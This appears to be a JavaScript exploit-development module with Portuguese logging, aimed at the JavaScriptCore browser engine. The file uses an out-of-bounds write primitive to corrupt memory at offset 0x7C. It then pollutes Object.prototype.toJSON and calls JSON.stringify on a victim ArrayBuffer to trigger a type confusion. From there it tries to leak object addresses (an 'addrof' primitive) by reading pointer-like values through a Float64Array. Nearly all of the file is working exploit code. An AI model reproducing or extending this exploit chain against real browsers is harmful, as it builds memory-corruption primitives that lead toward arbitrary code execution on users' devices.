// js/script3/testArrayBufferVictimCrash.mjs (v4.1 - Enhanced Probe Logging)
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

// Mantendo o nome do módulo para consistência com os logs anteriores, mas indicando a nova versão no comentário.
export const FNAME_MODULE_V28 = "OriginalHeisenbug_Plus_Addrof_v4_ButterflyPrep"; // Versão interna v4.1

const CRITICAL_OOB_WRITE_VALUE  = 0xFFFFFFFF;
const VICTIM_AB_SIZE = 256; // Aumentado para dar mais espaço

let toJSON_call_details_v28 = null;
let object_to_leak_A = null;
let object_to_leak_B = null;

// Sonda com tentativa de preparação do butterfly e logging aprimorado
function toJSON_V28_Probe_ButterflyPrep() {
    toJSON_call_details_v28 = {
        probe_variant: "V28_Probe_ButterflyPrep_v4.1_EnhancedLog", // Versão da sonda
        this_type_in_toJSON: "N/A_before_call",
        error_in_toJSON: null,
        probe_called: false,
        objA_assignment_check: "Not_Attempted",
        objB_assignment_check: "Not_Attempted"
    };

    try {
        toJSON_call_details_v28.probe_called = true;
        toJSON_call_details_v28.this_type_in_toJSON = Object.prototype.toString.call(this);
        logS3(`[${toJSON_call_details_v28.probe_variant}] 'this' é o objeto vítima. Tipo de 'this': ${toJSON_call_details_v28.this_type_in_toJSON}`, "leak", FNAME_MODULE_V28);

        if (this === victim_ab_ref_for_original_test && toJSON_call_details_v28.this_type_in_toJSON === '[object Object]') {
            logS3(`[${toJSON_call_details_v28.probe_variant}] HEISENBUG CONFIRMADA! Preparando butterfly e tentando escritas...`, "vuln", FNAME_MODULE_V28);

            try {
                // Tentativa de forçar alocação/expansão do butterfly
                this[10] = 0.5; // Escrever em um índice um pouco mais alto
                this[11] = 1.5;
                logS3(`[${toJSON_call_details_v28.probe_variant}] Butterfly prep writes (this[10], this[11]) realizadas.`, "info", FNAME_MODULE_V28);
            } catch (e_prep) {
                logS3(`[${toJSON_call_details_v28.probe_variant}] Erro durante butterfly prep: ${e_prep.message}`, "warn", FNAME_MODULE_V28);
            }

            if (object_to_leak_A) {
                this[0] = object_to_leak_A;
                logS3(`[${toJSON_call_details_v28.probe_variant}] Escrita de object_to_leak_A em this[0] (supostamente) realizada.`, "info", FNAME_MODULE_V28);
                // --- Enhanced Logging for ObjA ---
                const typeof_this0_A = typeof this[0];
                const is_this0_A_object_to_leak_A = this[0] === object_to_leak_A;
                toJSON_call_details_v28.objA_assignment_check = `typeof: ${typeof_this0_A}, === object_to_leak_A: ${is_this0_A_object_to_leak_A}`;
                logS3(`[${toJSON_call_details_v28.probe_variant}] >>> typeof this[0] (ObjA) após atribuição: ${typeof_this0_A}`, "leak", FNAME_MODULE_V28);
                logS3(`[${toJSON_call_details_v28.probe_variant}] >>> this[0] === object_to_leak_A ? ${is_this0_A_object_to_leak_A}`, "leak", FNAME_MODULE_V28);
                try {
                    logS3(`[${toJSON_call_details_v28.probe_variant}] >>> String(this[0]) (ObjA): ${String(this[0])}`, "leak", FNAME_MODULE_V28);
                } catch (e_str_objA) {
                    logS3(`[${toJSON_call_details_v28.probe_variant}] >>> Erro ao converter this[0] (ObjA) para String: ${e_str_objA.message}`, "warn", FNAME_MODULE_V28);
                    toJSON_call_details_v28.objA_assignment_check += ` | String(this[0]) Error: ${e_str_objA.message}`;
                }
                // --- End Enhanced Logging for ObjA ---
            } else {
                 toJSON_call_details_v28.objA_assignment_check = "object_to_leak_A was null";
            }

            if (object_to_leak_B) {
                this[1] = object_to_leak_B;
                logS3(`[${toJSON_call_details_v28.probe_variant}] Escrita de object_to_leak_B em this[1] (supostamente) realizada.`, "info", FNAME_MODULE_V28);
                // --- Enhanced Logging for ObjB ---
                const typeof_this1_B = typeof this[1];
                const is_this1_B_object_to_leak_B = this[1] === object_to_leak_B;
                toJSON_call_details_v28.objB_assignment_check = `typeof: ${typeof_this1_B}, === object_to_leak_B: ${is_this1_B_object_to_leak_B}`;
                logS3(`[${toJSON_call_details_v28.probe_variant}] >>> typeof this[1] (ObjB) após atribuição: ${typeof_this1_B}`, "leak", FNAME_MODULE_V28);
                logS3(`[${toJSON_call_details_v28.probe_variant}] >>> this[1] === object_to_leak_B ? ${is_this1_B_object_to_leak_B}`, "leak", FNAME_MODULE_V28);
                try {
                    logS3(`[${toJSON_call_details_v28.probe_variant}] >>> String(this[1]) (ObjB): ${String(this[1])}`, "leak", FNAME_MODULE_V28);
                } catch (e_str_objB) {
                    logS3(`[${toJSON_call_details_v28.probe_variant}] >>> Erro ao converter this[1] (ObjB) para String: ${e_str_objB.message}`, "warn", FNAME_MODULE_V28);
                    toJSON_call_details_v28.objB_assignment_check += ` | String(this[1]) Error: ${e_str_objB.message}`;
                }
                // --- End Enhanced Logging for ObjB ---
            } else {
                toJSON_call_details_v28.objB_assignment_check = "object_to_leak_B was null";
            }

        } else if (this === victim_ab_ref_for_original_test) {
            logS3(`[${toJSON_call_details_v28.probe_variant}] Heisenbug NÃO confirmada nesta chamada. Tipo de 'this': ${toJSON_call_details_v28.this_type_in_toJSON}`, "warn", FNAME_MODULE_V28);
        } else {
            logS3(`[${toJSON_call_details_v28.probe_variant}] 'this' NÃO é victim_ab_ref_for_original_test. Tipo de 'this': ${toJSON_call_details_v28.this_type_in_toJSON}. Ignorando escritas.`, "info", FNAME_MODULE_V28);
        }

    } catch (e) {
        toJSON_call_details_v28.error_in_toJSON = `${e.name}: ${e.message}`;
        logS3(`[${toJSON_call_details_v28.probe_variant}] ERRO na sonda: ${e.name} - ${e.message}${e.stack ? ('\n' + e.stack) : ''}`, "error", FNAME_MODULE_V28);
    }
    // O retorno da sonda para JSON.stringify não deve ser muito complexo para não interferir.
    return { probe_variant_executed: toJSON_call_details_v28.probe_variant };
}

let victim_ab_ref_for_original_test = null;

export async function executeArrayBufferVictimCrashTest() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_V28}.triggerAndAddrof_v4.1`; // Nome da função de teste atualizado
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug e Tentativa de Addrof com Prep de Butterfly (Enhanced Logging) ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_V28} Inic_v4.1...`;

    toJSON_call_details_v28 = null; // Resetado a cada execução
    victim_ab_ref_for_original_test = null;
    object_to_leak_A = { marker: "ObjA_v4.1", id: Date.now(), some_value: Math.random() }; // Adicionado valor aleatório
    object_to_leak_B = { marker: "ObjB_v4.1", id: Date.now() + 234, another_value: Math.random() };

    let errorCapturedMain = null;
    let stringifyOutput = null;
    
    let addrof_result_A = { success: false, leaked_address_as_double: null, leaked_address_as_int64: null, message: "Addrof A @ view[0]: Não tentado ou Heisenbug falhou." };
    let addrof_result_B = { success: false, leaked_address_as_double: null, leaked_address_as_int64: null, message: "Addrof B @ view[1]: Não tentado ou Heisenbug falhou." };
    
    const corruptionTargetOffsetInOOBAB = 0x7C;
    const fillPattern = 0.123456789101112; // Padrão de preenchimento original

    try {
        await triggerOOB_primitive({ force_reinit: true });
         if (!oob_array_buffer_real || typeof oob_write_absolute !== 'function') { // Verificação robustecida
             throw new Error("OOB Init falhou ou oob_write_absolute não está disponível.");
         }
        logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);
        logS3(`    Alvo da corrupção OOB em oob_array_buffer_real: ${toHex(corruptionTargetOffsetInOOBAB)}`, "info", FNAME_CURRENT_TEST);

        logS3(`PASSO 1: Escrevendo valor CRÍTICO ${toHex(CRITICAL_OOB_WRITE_VALUE)} em oob_array_buffer_real[${toHex(corruptionTargetOffsetInOOBAB)}]...`, "warn", FNAME_CURRENT_TEST);
        oob_write_absolute(corruptionTargetOffsetInOOBAB, CRITICAL_OOB_WRITE_VALUE, 4);
        logS3(`  Escrita OOB crítica em ${toHex(corruptionTargetOffsetInOOBAB)} realizada.`, "info", FNAME_CURRENT_TEST);
        
        await PAUSE_S3(100); // Pausa curta

        victim_ab_ref_for_original_test = new ArrayBuffer(VICTIM_AB_SIZE);
        let float64_view_on_victim = new Float64Array(victim_ab_ref_for_original_test);
        
        // Preencher com um padrão reconhecível
        for (let i = 0; i < float64_view_on_victim.length; i++) {
            float64_view_on_victim[i] = fillPattern + i; // Padrão variado para diferenciar posições
        }
        logS3(`PASSO 2: victim_ab (tamanho ${VICTIM_AB_SIZE} bytes) criado. View preenchida com padrão a partir de ${float64_view_on_victim[0]}. Tentando JSON.stringify com ${toJSON_V28_Probe_ButterflyPrep.name}...`, "test", FNAME_CURRENT_TEST);
        
        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, {
                value: toJSON_V28_Probe_ButterflyPrep,
                writable: true, configurable: true, enumerable: false
            });
            pollutionApplied = true;
            logS3(`  Object.prototype.${ppKey} poluído com ${toJSON_V28_Probe_ButterflyPrep.name}.`, "info", FNAME_CURRENT_TEST);

            logS3(`  Chamando JSON.stringify(victim_ab_ref_for_original_test)...`, "warn", FNAME_CURRENT_TEST);
            stringifyOutput = JSON.stringify(victim_ab_ref_for_original_test); 
            
            logS3(`  JSON.stringify(victim_ab_ref_for_original_test) completou. Resultado (da sonda para stringify): ${stringifyOutput ? JSON.stringify(stringifyOutput) : 'N/A'}`, "info", FNAME_CURRENT_TEST);
            // Log dos detalhes completos da sonda é crucial
            logS3(`  Detalhes COMPLETOS da sonda (toJSON_call_details_v28): ${toJSON_call_details_v28 ? JSON.stringify(toJSON_call_details_v28) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);

            if (toJSON_call_details_v28 && toJSON_call_details_v28.probe_called && toJSON_call_details_v28.this_type_in_toJSON === "[object Object]") {
                logS3(`  HEISENBUG CONFIRMADA (via toJSON_call_details_v28)! Tipo de 'this': ${toJSON_call_details_v28.this_type_in_toJSON}`, "vuln", FNAME_CURRENT_TEST);
                logS3(`    Detalhes da atribuição ObjA na sonda: ${toJSON_call_details_v28.objA_assignment_check || 'N/A'}`, "info", FNAME_CURRENT_TEST);
                logS3(`    Detalhes da atribuição ObjB na sonda: ${toJSON_call_details_v28.objB_assignment_check || 'N/A'}`, "info", FNAME_CURRENT_TEST);
                
                await PAUSE_S3(SHORT_PAUSE_S3); // Pequena pausa para estabilização antes da leitura

                logS3("PASSO 3: Verificando float64_view_on_victim APÓS Heisenbug e tentativas de escrita na sonda...", "warn", FNAME_CURRENT_TEST);

                // Checar Objeto A em view[0]
                const val_A_double = float64_view_on_victim[0];
                addrof_result_A.leaked_address_as_double = val_A_double;
                let temp_buf_A = new ArrayBuffer(8); new Float64Array(temp_buf_A)[0] = val_A_double;
                addrof_result_A.leaked_address_as_int64 = new AdvancedInt64(new Uint32Array(temp_buf_A)[0], new Uint32Array(temp_buf_A)[1]);
                logS3(`  Valor lido de float64_view_on_victim[0] (esperado ObjA): ${val_A_double} (Int64: ${addrof_result_A.leaked_address_as_int64.toString(true)}) vs Padrão: ${fillPattern + 0}`, "leak", FNAME_CURRENT_TEST);

                if (val_A_double !== (fillPattern + 0) && val_A_double !== 0 &&
                    (addrof_result_A.leaked_address_as_int64.high() < 0x00020000 || (addrof_result_A.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) { // Condição de ponteiro JSC típica
                    logS3("  !!!! VALOR LIDO em view[0] PARECE UM PONTEIRO POTENCIAL (ObjA) !!!!", "vuln", FNAME_CURRENT_TEST);
                    addrof_result_A.success = true;
                    addrof_result_A.message = "Heisenbug confirmada E leitura de view[0] sugere um ponteiro para ObjA.";
                } else {
                    addrof_result_A.message = `Heisenbug confirmada, mas valor lido de view[0] (${toHex(addrof_result_A.leaked_address_as_int64.low())}_${toHex(addrof_result_A.leaked_address_as_int64.high())}) não parece ponteiro para ObjA ou buffer não foi alterado do padrão.`;
                }

                // Checar Objeto B em view[1]
                const val_B_double = float64_view_on_victim[1];
                addrof_result_B.leaked_address_as_double = val_B_double;
                let temp_buf_B = new ArrayBuffer(8); new Float64Array(temp_buf_B)[0] = val_B_double;
                addrof_result_B.leaked_address_as_int64 = new AdvancedInt64(new Uint32Array(temp_buf_B)[0], new Uint32Array(temp_buf_B)[1]);
                logS3(`  Valor lido de float64_view_on_victim[1] (esperado ObjB): ${val_B_double} (Int64: ${addrof_result_B.leaked_address_as_int64.toString(true)}) vs Padrão: ${fillPattern + 1}`, "leak", FNAME_CURRENT_TEST);
                
                if (val_B_double !== (fillPattern + 1) && val_B_double !== 0 &&
                    (addrof_result_B.leaked_address_as_int64.high() < 0x00020000 || (addrof_result_B.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                    logS3("  !!!! VALOR LIDO em view[1] PARECE UM PONTEIRO POTENCIAL (ObjB) !!!!", "vuln", FNAME_CURRENT_TEST);
                    addrof_result_B.success = true;
                    addrof_result_B.message = "Heisenbug confirmada E leitura de view[1] sugere um ponteiro para ObjB.";
                } else {
                    addrof_result_B.message = `Heisenbug confirmada, mas valor lido de view[1] (${toHex(addrof_result_B.leaked_address_as_int64.low())}_${toHex(addrof_result_B.leaked_address_as_int64.high())}) não parece ponteiro para ObjB ou buffer não foi alterado do padrão.`;
                }

                if (addrof_result_A.success || addrof_result_B.success) {
                    document.title = `${FNAME_MODULE_V28}: Addr? SUCESSO PARCIAL/TOTAL!`;
                } else {
                     document.title = `${FNAME_MODULE_V28}: Heisenbug OK, Addr Falhou`;
                }

            } else {
                let msg = "Heisenbug (this como [object Object]) não foi confirmada via toJSON_call_details_v28.";
                if(toJSON_call_details_v28 && toJSON_call_details_v28.this_type_in_toJSON) msg += ` Tipo obs: ${toJSON_call_details_v28.this_type_in_toJSON}.`;
                else if (!toJSON_call_details_v28) msg += " toJSON_call_details_v28 é null.";
                else if (!toJSON_call_details_v28.probe_called) msg += " Sonda não foi chamada.";
                addrof_result_A.message = msg; addrof_result_B.message = msg;
                logS3(`  ALERTA: ${msg}`, "error", FNAME_CURRENT_TEST);
                document.title = `${FNAME_MODULE_V28}: Heisenbug Falhou`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            logS3(`    ERRO CRÍTICO durante JSON.stringify ou lógica de addrof: ${e_str.name} - ${e_str.message}${e_str.stack ? '\n'+e_str.stack : ''}`, "critical", FNAME_CURRENT_TEST);
            document.title = `${FNAME_MODULE_V28}: Stringify/Addrof ERR`;
            addrof_result_A.message = `Erro na execução principal: ${e_str.name} - ${e_str.message}`;
            addrof_result_B.message = `Erro na execução principal: ${e_str.name} - ${e_str.message}`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
                else delete Object.prototype[ppKey];
                 logS3(`  Object.prototype.${ppKey} restaurado.`, "info", FNAME_CURRENT_TEST);
            }
        }

    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        logS3(`ERRO CRÍTICO GERAL no teste: ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST);
        if (e_outer_main.stack) logS3(`Stack: ${e_outer_main.stack}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MODULE_V28} FALHOU CRITICAMENTE`;
        addrof_result_A.message = `Erro geral no teste: ${e_outer_main.name}`;
        addrof_result_B.message = `Erro geral no teste: ${e_outer_main.name}`;
    } finally {
        clearOOBEnvironment({force_clear_even_if_not_setup: true}); // Limpeza mais explícita
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Resultado Addrof A (view[0]): Success=${addrof_result_A.success}, Msg='${addrof_result_A.message}'`, addrof_result_A.success ? "good" : "warn", FNAME_CURRENT_TEST);
        if(addrof_result_A.leaked_address_as_int64){
            logS3(`  Addrof A (Int64): ${addrof_result_A.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);
        }
        logS3(`Resultado Addrof B (view[1]): Success=${addrof_result_B.success}, Msg='${addrof_result_B.message}'`, addrof_result_B.success ? "good" : "warn", FNAME_CURRENT_TEST);
        if(addrof_result_B.leaked_address_as_int64){
            logS3(`  Addrof B (Int64): ${addrof_result_B.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);
        }
        // Resetar variáveis globais para o próximo teste, se houver
        object_to_leak_A = null;
        object_to_leak_B = null;
        victim_ab_ref_for_original_test = null;
        toJSON_call_details_v28 = null;
    }
    return { 
        errorOccurred: errorCapturedMain, 
        potentiallyCrashed: false, // Assumindo que não travou se chegou aqui
        stringifyResult: stringifyOutput, 
        toJSON_details: toJSON_call_details_v28, // Retorna os detalhes completos
        addrof_A_attempt_result: addrof_result_A,
        addrof_B_attempt_result: addrof_result_B
    };
}
